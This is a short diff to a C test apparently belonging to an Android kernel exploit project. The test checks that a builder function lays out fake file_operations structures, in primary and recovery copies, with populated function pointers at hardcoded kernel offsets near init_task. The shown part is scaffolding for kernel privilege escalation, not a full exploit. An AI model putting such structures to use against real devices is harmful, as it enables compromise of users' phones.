@@ -18,8 +18,20 @@ int main(void) {
   const uint64_t init_task = kernel + 0x02c05080ULL;
 
   build_fops_install_object(object, base, kernel, ashmem, init_task);
-  if (get64(object, 0x2000) != 0 ||
-      get64(object, 0x2008) != (base | 0x14e8ULL) ||
+  if (get64(object, OSS_PRIMARY_FOPS_BUFFER_OFFSET) != 0 ||
+      get64(object, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 8) !=
+          (base | 0x14e8ULL) ||
+      get64(object, OSS_RECOVERY_FOPS_BUFFER_OFFSET) != 0 ||
+      get64(object, OSS_RECOVERY_FOPS_BUFFER_OFFSET + 8) !=
+          (base | 0x14e8ULL) ||
+      memcmp(object + OSS_PRIMARY_FOPS_BUFFER_OFFSET,
+             object + OSS_RECOVERY_FOPS_BUFFER_OFFSET,
+             OSS_FAKE_FOPS_POPULATED_SIZE) != 0 ||
+      get64(object, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x20) == 0 ||
+      get64(object, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x28) == 0 ||
+      get64(object, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x50) == 0 ||
+      get64(object, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x70) == 0 ||
+      get64(object, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x80) == 0 ||
       get64(object, 0x2218) != (base | 0x14d0ULL) ||
       get64(object, 0x2220) != (base | 0x14d0ULL) ||
       get64(object, 0x2228) != 1) {
